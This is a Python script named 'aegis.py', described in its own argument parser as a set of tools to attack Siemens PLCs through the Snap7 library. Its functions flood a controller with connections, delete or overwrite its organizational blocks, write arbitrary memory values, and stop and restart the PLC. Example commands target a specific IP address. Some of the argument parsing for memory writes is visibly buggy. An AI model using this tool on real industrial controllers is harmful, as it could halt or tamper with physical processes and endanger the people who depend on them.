import sys
import snap7
from snap7.util import *
from snap7.type import *
import argparse
import time


"""
aegis.py

A toolset for interacting with Siemens PLCs (Programmable Logic Controllers) using the Snap7 library.
This script allows various operations such as connecting to PLCs, writing/reading memory, copying/deleting organizational blocks,
and managing PLC start/stop sequences. It can be used for testing, maintenance, or research purposes.

Examples:
    python3 aegis.py -i 192.168.101.11 -c 10
    python3 aegis.py -i 192.168.101.11 -s
    python3 aegis.py -i 192.168.101.11 --stop-start 5 -s
    python3 aegis.py -i 192.168.101.11 -d 1
    python3 aegis.py -i 192.168.101.11 --copy 1 -d 1 -t 30 --paste 192.168.101.11 1
    python3 aegis.py -i 192.168.101.11 --read Areas.PE,0,0,S7WLBit,1
"""


def connections(interface, nb_connection=1):
    """
        Establish multiple simultaneous connections to the PLC.

        Args:
            interface (str): IP address of the PLC.
            nb_connection (int): Number of simultaneous connections to create.
    """
    for i in range(nb_connection):
        PLC_connection.append(snap7.client.Client())
        PLC_connection[-1].connect(interface, RACK, SLOT)
        print("Connection", i, "is", PLC_connection[-1].get_connected())

    while True:
        continue


def saturation(interface):
    """
        Continuously open connections with various connection types to saturate the PLC.

        Args:
            interface (str): IP address of the PLC.
    """
    counter = 0
    connection_type = [1, 2, 3, 0xFD]
    while True:
        try:
            for i in connection_type:
                PLC_connection.append(snap7.client.Client())
                PLC_connection[-1].set_connection_type(i)
                PLC_connection[-1].connect(interface, RACK, SLOT)
                print("Connection", counter, "is", PLC_connection[-1].get_connected())
        except KeyboardInterrupt:
            print("exit...")
            sys.exit()
        except:
            print("Connection", counter, "is impossible...")

        counter += 1


def delete_ob(interface, ob_number):
    """
        Delete an Organizational Block (OB) from the PLC.

        Args:
            interface (str): IP address of the PLC.
            ob_number (int): OB number to delete.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    PLC_connection[-1].delete(Block.OB, ob_number)
    print(ob_number, "deleted!")


def copy_ob(interface, ob_number):
    """
        Download the content of an OB from the PLC.

        Args:
            interface (str): IP address of the PLC.
            ob_number (int): OB number to copy.

        Returns:
            bytes: The binary content of the OB.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    data = PLC_connection[-1].full_upload(Block.OB, ob_number)
    print(bytes(data[0]))
    print(ob_number, "downloaded!")

    return bytes(data[0])


def paste_ob(data, interface, ob_number):
    """
        Upload data into a specified OB on the PLC.

        Args:
            data (bytes): Data to upload.
            interface (str): IP address of the PLC.
            ob_number (int): OB number where the data will be written.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    PLC_connection[-1].download(data, ob_number)
    print("Data write into", ob_number)


def write_memory(interface, area, byte, bit, datatype, value, db_number=0):
    """
        Write a value to a specific memory location in the PLC.

        Args:
            interface (str): IP address of the PLC.
            area (int): Memory area (e.g., Areas.DB).
            byte (int): Byte offset.
            bit (int): Bit offset (used for boolean).
            datatype (int): Data type (e.g., S7WLByte, S7WLBit).
            value (int or float): Value to write.
            db_number (int): DB number (default is 0).
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    print("Connection established...", PLC_connection[-1].get_connected())
    if PLC_connection[-1].get_connected() is True:
        result = PLC_connection[-1].read_area(area, db_number, byte, datatype)
        if datatype == WordLen.Bit:
            set_bool(result, 0, bit, value)
        elif datatype == WordLen.Byte or datatype == WordLen.Word:
            set_int(result, 0, value)
        elif datatype == WordLen.Real:
            set_real(result, 0, value)
        elif datatype == WordLen.DWord:
            set_dword(result, 0, value)
        PLC_connection[-1].write_area(area, db_number, byte, result)



def read_memory(interface, area, byte, bit, datatype, db_number=0):
    """
        Read a value from a specific memory location in the PLC.

        Args:
            interface (str): IP address of the PLC.
            area (int): Memory area (e.g., Areas.DB).
            byte (int): Byte offset.
            bit (int): Bit offset (used for boolean).
            datatype (int): Data type (e.g., S7WLByte, S7WLBit).
            db_number (int): DB number (default is 0).

        Returns:
            int/float/bool/bytes: The value read from the PLC memory.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    print("Connection established...", PLC_connection[-1].get_connected())
    if PLC_connection[-1].get_connected() is True:
        result = PLC_connection[-1].read_area(area, db_number, byte, datatype)

        if datatype == WordLen.Bit:
            return get_bool(result, 0, bit)
        elif datatype == WordLen.Byte or datatype == WordLen.Word:
            return get_int(result, 0)
        elif datatype == WordLen.Real:
            return get_real(result, 0)
        elif datatype == WordLen.DWord:
            return get_dword(result, 0)

    return None


def stop_start(interface, duration):
    """
        Stop the PLC and restart it after a specified duration.

        Args:
            interface (str): IP address of the PLC.
            duration (int): Time to wait (in seconds) before restarting.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    PLC_connection[-1].plc_stop()
    print("PLC stopped...")
    print("Sleep for", duration, "seconds...")
    time.sleep(duration)
    PLC_connection[-1].plc_cold_start()
    print("PLC started...")


def stop(interface):
    """
        Stop the PLC.

        Args:
            interface (str): IP address of the PLC.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    PLC_connection[-1].plc_stop()
    print("PLC stopped...")


def start(interface):
    """
        Start the PLC.

        Args:
            interface (str): IP address of the PLC.
    """
    PLC_connection.append(snap7.client.Client())
    PLC_connection[-1].connect(interface, RACK, SLOT)
    PLC_connection[-1].plc_cold_start()
    print("PLC started...")


parser = argparse.ArgumentParser(description="Set of tools to attack PLCs.")
parser.add_argument('-i', '--interface', required=True, type=str, help='ip address of PLC interface to interact with')
parser.add_argument('-c', '--connection', metavar='NB_CONNECTION', type=int, help='number of connections to maintain')
parser.add_argument('-s', '--saturation', action='store_true', help='saturation of the interface')
parser.add_argument('--stop-start', metavar='DURATION', type=int, help='stop the PLC and start it after a duration passed as argument')
parser.add_argument('--copy', metavar='OB_NUM', type=int, help='copy OB passed as argument')
parser.add_argument('--paste', metavar=('INTERFACE', 'OB_NUM'), nargs=2, help='paste data into OB passed as argument')
parser.add_argument('-t', '--time', metavar='NB_SECONDS', type=int, help='adding a delay between 2 actions')
parser.add_argument('-d', '--delete', metavar='OB_NUM', type=int, help='delete OB passed as argument')
parser.add_argument('--write', metavar='AREA, BYTE, BIT, DATATYPE, VALUE, [DB_NUMBER]', type=str, help='command to write into PLC register')
parser.add_argument('--read', metavar='AREA, BYTE, BIT, DATATYPE, [DB_NUMBER]', type=str, help='command to read into PLC register')
parser.add_argument('--stop', action='store_true', help='stop the PLC')
parser.add_argument('--start', action='store_true', help='start the PLC')
args_parser = parser.parse_args()
args = sys.argv

args_list = ['-c', '--connection', '-s', '--saturation', '--stop-start', '-t', '--time', '-d', '--delete', '--copy', '--paste', '--write', '--read', '--stop', '--start']
PLC_connection = [snap7.client.Client()]
RACK = 0                          # Rack position of PLCs (default)
SLOT = 2                          # Slot position of PLCs (default)

for command_arg in args:
    if command_arg in args_list:
        if command_arg == "-c" or command_arg == "--connection":
            connections(args_parser.interface, args_parser.connection)
        if command_arg == "-s" or command_arg == "--saturation":
            saturation(args_parser.interface)
        if command_arg == "--stop-start":
            stop_start(args_parser.interface, args_parser.stop_start)
        if command_arg == "-t" or command_arg == "--time":
            print("Sleep for", args_parser.time, "seconds...")
            time.sleep(args_parser.time)
        if command_arg == "-d" or command_arg == "--delete":
            delete_ob(args_parser.interface, args_parser.delete)
        if command_arg == "--copy":
            data = copy_ob(args_parser.interface, args_parser.copy)
        if command_arg == "--paste":
            paste_ob(data, args_parser.paste[0], int(args_parser.paste[1]))
        if command_arg == "--write":
            data = args_parser.write.split(',')
            if data[0] == "Areas.DB":
                data[0] = Areas.DB
            elif data[0] == "Areas.MK":
                data[0] = Areas.MK
            elif data[0] == "Areas.PE":
                data[0] = Areas.PE
            elif data[0] == "Areas.PA":
                data[0] = Areas.PA
            elif data[0] == "Areas.CT":
                data[0] = Areas.CT
            elif data[0] == "Areas.TM":
                data[0] = Areas.MK

            if data[3] == "Bit":
                data[3] = WordLen.Bit
            elif data[3] == "Byte":
                data[3] = WordLen.Byte
            elif data[3] == "Real":
                data[3] = WordLen.Real
            elif data[3] == "DWord":
                data[3] = WordLen.DWord

            if len(data) == 5:
                write_memory(args_parser.interface, data[1], data[2], data[3], data[4], data[5])
            else:
                write_memory(args_parser.interface, data[0], int(data[1]), int(data[2]), data[3], int(data[4]), int(data[5]))

        if command_arg == "--read":
            data = args_parser.read.split(',')
            if data[0] == "Areas.DB":
                data[0] = Areas.DB
            elif data[0] == "Areas.MK":
                data[0] = Areas.MK
            elif data[0] == "Areas.PE":
                data[0] = Areas.PE
            elif data[0] == "Areas.PA":
                data[0] = Areas.PA
            elif data[0] == "Areas.CT":
                data[0] = Areas.CT
            elif data[0] == "Areas.TM":
                data[0] = Areas.TM

            if data[3] == "Bit":
                data[3] = WordLen.Bit
            elif data[3] == "Byte":
                data[3] = WordLen.Byte
            elif data[3] == "Real":
                data[3] = WordLen.Real
            elif data[3] == "DWord":
                data[3] = WordLen.DWord

            if len(data) == 4:
                data_read = read_memory(args_parser.interface, data[0], int(data[1]), int(data[2]), data[3])
            else:
                data_read = read_memory(args_parser.interface, data[0], int(data[1]), int(data[2]), data[3], int(data[4]))
            print(data_read)

        if command_arg == "--stop":
            stop(args_parser.interface)

        if command_arg == "--start":
            start(args_parser.interface)




